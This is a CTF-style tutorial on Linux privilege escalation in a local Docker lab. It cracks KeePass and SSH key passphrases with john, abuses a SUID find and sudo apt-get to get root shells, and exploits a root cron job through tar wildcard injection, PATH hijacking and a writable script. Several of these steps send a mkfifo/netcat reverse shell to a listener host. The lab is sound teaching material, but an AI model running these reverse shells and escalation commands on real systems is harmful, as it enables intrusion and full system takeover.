
# Linux Priv Esc Crash Course


## Credential Hunting

When trying to escalate your privileges the first thing you should try is credential hunting. Credential hunting is when you look for credentials (username/passwords) of other users on the target system. 

Here is a small checklist of things you might want to look for: 
- config files
- SQL Databases
- environment variables
- history 
- password manager databases
- ssh keys
- text files
- pdf files
- git history
- `/etc/shadow` - file read vulnerability lets us read shadow file for password hashes

The most common places I have seen credentials on CTF boxes is in config files in `/var/www/html` when the box is running a website. Usually if a box is running `php` then you will likely find a `config.php` which has credentials to a running SQL database which you can then query to find more credentials. The second most common place I have seen credentials in CTF boxes is in git history on a local git repo on the target. The third most common place I have found credentials is in onboarding pdf files. Finally, the fourth most common place  usually find credentials is a `.kdbx` password manager database on the target. 

In this demo we will assume we found a `Passwords.kdbx` and a valid `ssh` key on a target and managed to download them to our machine. 

The `Passwords.kdbx` database is encrypted so we need a password. We can use `john` to attempt to discover the password. 

The following command extracts the password hash of the password encrypting the database. 
```
keepass2john Passwords.kdbx > hash.txt
```

Next we can use `john` to try to crack the hash. If the password is weak there is a good chance we can discover the password. 

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

It turns out the password is weak and the password is `bubbles`

```
john --show hash.txt                                     
Passwords:bubbles
```

We can use this password to open the `keepass` database and in there we discover the root password.

```
keepassxc Passwords.kdbx
```

The same kind of attack can be used on found `ssh` keys that are encrypted. 

```
ssh2john ssh_key > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                                     
ssh_key:butterfly
```

We discover that the password for the `ssh` key is butterfly. If this was a real CTF challenge we could then use that `ssh` key to `ssh` into the target. 

## SUID Binaries

In Linux if a binary has the super user id bit set. Then the file will execute with the privileges of the owner of the binary. In this case we are interested in finding binaries that are owned by root that have the SUID bit set because when we run them they will run with root privileges. If we are lucky and we find a binary with the SUID bit set then we may be able to abuse that binary to escalate our privileges to `root`. 


Here is how this works

We will run the lab docker container

```
sudo ./challenge.sh
```

Once logged into the docker container as `ctf` user we can search for binaries with the `SUID` bit set. 
```
ctf@9ef33f00ceaf:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
```

Then we can look at CTFObins website to see if any of these binaries have a known exploit. 

- https://gtfobins.org/

Note: Sometimes custom binaries or scripts have the SUID bit set. In this case you will have to analyze the binary or script yourself to see if you can exploit it. 

But we see that `find` has the `SUID` bit set and GTFObins tells us we can abuse this to spawn a root shell. 

```
ctf@9ef33f00ceaf:~$ find . -exec /bin/sh -p \; -quit
# whoami
root
```


## SUDO Rights

Sometimes we may be an underprivileged user that has `sudo` rights for some commands. 

We can check if we have `sudo` rights by running `sudo -l`

```
ctf@5db3a915e285:~$ sudo -l 
Matching Defaults entries for ctf on 5db3a915e285:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ctf may run the following commands on 5db3a915e285:
    (root) NOPASSWD: /usr/bin/apt-get
```

It looks like the `ctf` user has permissions to run `apt-get` with `sudo` rights. This is probably because the `ctf` user needs permissions to download new software.  

Again we can look at GTFObins and `apt` is a binary that can be abused to spawn a root shell. 

```
ctf@5db3a915e285:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
root
```


## Cron Jobs

Another good place to look for potential privilege escalation attacks is cron jobs. 

If a cron job has been setup to run with root privileges periodically maybe we can abuse the cron job to escalate our privileges. 

We can see on the challenge container there is a backup script running every minute with root privileges. 
```
ctf@ba71f9a41f26:~$ cat /etc/cron.d/ctf-cron 
SHELL=/bin/bash
PATH=/home/ctf/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * /usr/local/sbin/backup.sh
```

Let's checkout the `backup.sh` script and see if we can abuse it to escalate our privileges. 

```bash
#!/bin/bash

export PATH="/home/ctf/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

cd /opt/data || exit 1

tar -cvf /var/backups/data.tar.gz *
```

There are actually 3 ways we can abuse this script and we will cover them all here. 

The first vulnerability is with the `tar` command the script is executing. The issue with the `tar` command is when `tar` is run with a wild card `*` it is vulnerable to a wild card injection attack. 

You can use `tar` to run scripts like this

```
tar -cvf  --checkpoint=1 --checkpoint-action=exec=sh evil.sh
```

Which would run an `evil.sh` script. But how do we add the `--checkpoint=1` and the `--checkpoint-action=exec=sh evil.sh` ? Well Linux is kinda dumb in that if you name a file `--checkpoint=1` the wild card `*` will expand that name and `tar` will treat that as a command argument. So we can actually abuse this cron job to execute our own custom `.sh` scripts if we can name a files `--checkpoint=1`, `--checkpoint-action=exec=sh evil.sh`, and add an executable `evil.sh` script to the `/opt/data` directory. 

For this demo let's try to get a reverse shell. 

In a second terminal set up a listener on your host machine outside the docker container. 

```
$ nc -lvnp 9001
```

Next inside the docker container we will create our exploit. 

```
ctf@ba71f9a41f26:~$ cd /opt/data
ctf@ba71f9a41f26:/opt/data$ touch './--checkpoint=1'
ctf@ba71f9a41f26:/opt/data$ touch './--checkpoint-action=exec=sh evil.sh'
ctf@ba71f9a41f26:/opt/data$ vim evil.sh
ctf@ba71f9a41f26:/opt/data$ chmod +x evil.sh
ctf@ba71f9a41f26:/opt/data$ ls
'--checkpoint-action=exec=sh evil.sh'  '--checkpoint=1'   empty.txt   evil.sh
```

This is the contents of `evil.sh` 

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.17.0.1 9001 >/tmp/f
```

Note: On the docker container network interface my host machine IP was `172.17.0.1`. 

After waiting a minute we catch the reverse shell!
```
$ nc -lvnp 9001 
listening on [any] 9001 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 58182
sh: 0: can't access tty; job control turned off
# whoami
root
```

The second issue with this script is `PATH` injection. So we see that the cron job executes with `PATH="/home/ctf/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"` and we have write permissions to `/home/ctf/bin` as the `ctf` user. This means that we can create a malicious `tar` executable and put it in `/home/ctf/bin` and the cron job will execute our malicious script instead of the `tar` binary. This is because `/home/ctf/bin` comes first in the path so when searching for `tar` it will find our malicious `tar` first instead of the actual `tar` which is in `/usr/bin/tar`. 

```
ctf@ba71f9a41f26:~$ cd /home/ctf/bin
ctf@ba71f9a41f26:~/bin$ vim tar
ctf@ba71f9a41f26:~/bin$ chmod +x tar
```

Again we can put our reverse shell script in `tar`

```
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.17.0.1 9001 >/tmp/f
```

And after waiting a minute for the cron job to execute eventually we will catch a reverse shell. 

```
nc -lvnp 9001 
listening on [any] 9001 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 56244
sh: 0: can't access tty; job control turned off
# whoami
root
```


The last and final thing we can do is actually just modify the `backup.sh` script since we have write permissions on this file. 

```
ctf@ba71f9a41f26:~$ ls -la /usr/local/sbin/backup.sh
-rwxrwxrwx 1 root root 163 Sep 27 21:31 /usr/local/sbin/backup.sh
ctf@ba71f9a41f26:~$ vim /usr/local/sbin/backup.sh
ctf@ba71f9a41f26:~$ cat /usr/local/sbin/backup.sh
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.17.0.1 9001 >/tmp/f
```

Again we wait a minute for the cron job to run and we catch a shell. 
```
$ nc -lvnp 9001 
listening on [any] 9001 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38868
sh: 0: can't access tty; job control turned off
# whoami
root
```



## Summary

This lab covers some basic linux privilege escalation attack vectors. This is by no means a comprehensive list, but it covers some of the main paths you will see in CTF challenges. 

- Credential Hunting (Finding creds of privileged users)
- SUID Binary Abuse
- SUDO Rights Abuse
- Cron Jobs
- PATH Injection
- Write permissions to scripts/programs that run with root permissions



## Further Study

TryHackMe has great labs on Linux and Windows privilege escalation:
- Linux Privilege Escalation (TryHackMe)
- Linux PrivEsc Arena (TryHackMe)
- Windows Privilege Escalation (TryHackMe)
- Windows PrivEsc Arena (TryHackMe)